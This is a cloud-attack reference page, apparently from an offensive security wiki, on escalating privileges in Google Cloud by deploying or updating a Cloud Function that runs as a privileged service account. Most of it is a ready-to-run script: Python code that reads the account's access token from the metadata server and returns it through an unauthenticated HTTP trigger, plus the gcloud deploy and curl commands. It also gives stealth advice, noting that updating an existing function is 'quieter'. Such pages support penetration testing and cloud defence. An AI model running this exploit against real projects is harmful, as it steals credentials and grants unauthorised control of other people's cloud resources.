---
title: "Cloud Function: deploy code as the function's service account"
description: "Deploying or updating a Cloud Function with cloudfunctions.functions.create or update plus actAs, running attacker code as the function's privileged service account."
keywords:
  - cloudfunctions
  - actAs
  - service account
  - function deploy
  - code execution
  - Cloud Functions
---

# Cloud Function

With `cloudfunctions.functions.create` (or `update`) and `actAs` on a service account, you deploy a function that runs your code as that account. The function body reads its own token from the metadata server and returns it, or acts directly with the account's permissions.

## Deploy a function that leaks its token

```bash
cat > main.py <<'EOF'
import requests, os
def pwn(request):
    t = requests.get(
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      headers={"Metadata-Flavor": "Google"}).text
    return t
EOF
echo "requests" > requirements.txt
gcloud functions deploy pwn --runtime=python311 --trigger-http --allow-unauthenticated \
  --entry-point=pwn --service-account=<privileged-sa>@<project>.iam.gserviceaccount.com --source=.
curl "$(gcloud functions describe pwn --format='value(httpsTrigger.url)')"
```

## Exploitation notes

- `--service-account` is where `actAs` is exercised; without specifying it the function runs as the default account, which is often Editor anyway.
- Gen2 functions run on Cloud Run under the hood; the token path is identical.
- Updating an existing function's code (`functions deploy` on the same name) is quieter than creating a new one and inherits its already-privileged account.

## Tools

- **gcloud** (`functions deploy`, `functions describe`): deploy and get the trigger URL.
- **GCP-IAM-Privilege-Escalation** (Rhino): automates the deploy-and-steal variant.

## References

- [Rhino Security Labs: GCP privilege escalation (part 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [GCP IAM privilege escalation (Rhino repo)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [Google: Cloud Functions service accounts](https://cloud.google.com/functions/docs/securing/function-identity)
